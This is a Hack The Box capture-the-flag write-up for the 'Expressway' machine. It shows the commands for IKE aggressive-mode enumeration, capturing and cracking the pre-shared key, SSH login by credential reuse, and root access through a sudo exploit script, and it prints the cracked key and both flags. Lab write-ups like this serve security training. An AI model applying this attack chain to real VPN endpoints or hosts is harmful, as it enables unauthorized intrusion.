---
layout: post
title: "Hack The Box — Expressway"
date: 2025-09-20 00:00:00 +0100
categories: [Hack The Box, Linux]
tags: [htb, vpn, ike, ipsec, sudo, privilege-escalation]
toc: true
comments: false
image:
  path: /assets/img/expressway/cover.png
  alt: Expressway HTB machine
---
✔ Enables TOC
✔ Proper category/tag rendering
✔ Correct image handling
✔ Matches top Chirpy HTB blogs

Expressway — Hack The Box Write-Up
Target IP: 10.10.11.87
Operating System: Linux
Attack Path: IKE (Aggressive Mode) → Credential Reuse → Sudo Privilege Escalation

Enumeration
I started with a combined TCP and UDP scan to avoid missing infrastructure services such as VPNs.

bash
Copier le code
nmap -sS -sU -sC -sV -F 10.10.11.87

Findings
22/tcp (SSH) — open

69/udp (TFTP) — open

500/udp (ISAKMP / IKE) — open

4500/udp (NAT-T) — open|filtered

The exposed IKE service on UDP port 500 immediately became the main attack focus.

IKE Enumeration
To identify how the VPN was configured, I enumerated the IKE service.

bash
Copier le code
ike-scan -M -A 10.10.11.87

Observations
Aggressive Mode enabled

Authentication: PSK

Encryption: 3DES

Hash: SHA1

Diffie-Hellman Group: modp1024

VPN identity leaked: ike@expressway.htb

Aggressive Mode exposes authentication material, allowing offline attacks against the PSK.

PSK Hash Capture
Using the leaked VPN identity, I captured the pre-shared key hash.

bash
Copier le code
ike-scan -M --aggressive 10.10.11.87 -n ike@expressway.htb --pskcrack=swart.txt

The handshake returned all parameters required for offline cracking.

PSK Cracking
I performed an offline dictionary attack against the captured PSK hash.

bash
Copier le code
psk-crack -d rockyou.txt swart.txt

Recovered PSK
text
Copier le code
freakingrockstarontheroad
This step was fully offline and did not interact with the target.

SSH Access (Credential Reuse)
I tested the recovered PSK against SSH.

bash
Copier le code
ssh ike@10.10.11.87

The login succeeded, confirming credential reuse between the VPN and system account.

User Flag
bash
Copier le code
cat /home/ike/user.txt
text
Copier le code
5ef9d5d919fa711e341f0c3d34667f1d
Local Enumeration
After gaining a user shell, I enumerated the system for privilege escalation paths.

bash
Copier le code
./linpeas.sh

Key Findings
Multiple sudo versions detected

Custom sudo binary located at /usr/local/bin/sudo

User ike is a member of the proxy group

The custom sudo installation suggested exposure to a recent sudo vulnerability.

Privilege Escalation (Sudo)
I exploited the vulnerable sudo configuration to escalate privileges.

Exploit Execution
bash
Copier le code
chmod +x /tmp/sudo-chwoot.sh
/tmp/sudo-chwoot.sh
Result
bash
Copier le code
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)

Root Flag
bash
Copier le code
cat /root/root.txt
text
Copier le code
6f5f991819fcc72e2c7cdfcbbe0936fe
Attack Chain Summary
UDP scan exposed an IKE VPN service

Aggressive Mode leaked PSK material

Offline cracking recovered VPN credentials

Credential reuse enabled SSH access

Vulnerable sudo configuration allowed root escalation

